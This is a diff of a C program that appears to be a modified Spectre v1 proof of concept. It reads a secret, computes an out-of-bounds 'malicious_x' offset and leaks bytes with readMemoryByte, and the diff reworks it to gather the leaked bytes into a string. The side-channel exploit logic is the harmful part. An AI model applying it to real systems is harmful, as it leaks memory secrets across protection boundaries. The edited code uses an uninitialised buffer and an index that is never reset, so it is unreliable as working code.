@@ -172,7 +172,7 @@ int main()
 {
 
     const char *secret = readimage();
-    printf("buffer %s", secret);
+    printf("S=  %s", secret);
 
     size_t malicious_x = (size_t)(secret - (char *)arr1);
     int i, score[2], len = strlen(secret);
@@ -196,19 +196,31 @@ int main()
     }
 
     printf("Reading %d bytes:\n", len);
+    char str[strlen(secret) * sizeof(double)];
+    printf("%lu rf", sizeof(str) / sizeof(double)); // prints 10
+
     while (--len >= 0)
     {
-        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+        // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
         readMemoryByte(malicious_x++, value, score);
-        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-        printf("0x%02X=’%c’ score=%d ", value[0],
-               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-
-        if (score[1] > 0)
+        // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+        // printf("0x%02X=’%c’ score=%d ", value[0],
+        //        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+        // char ch = value[0] > 31 && value[0] < 127 ? value[0] : '?';
+        while (str[i] != '\0')
         {
-            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-            printf("\n");
+            ++i;
         }
+        str[i++] = value[0];
+        str[i] = '\0';
+
+        // if (score[1] > 0)
+        // {
+        //     printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+        //     printf("\n");
+        // }
     }
+    printf("F=   %s", str);
+
     return (0);
 }
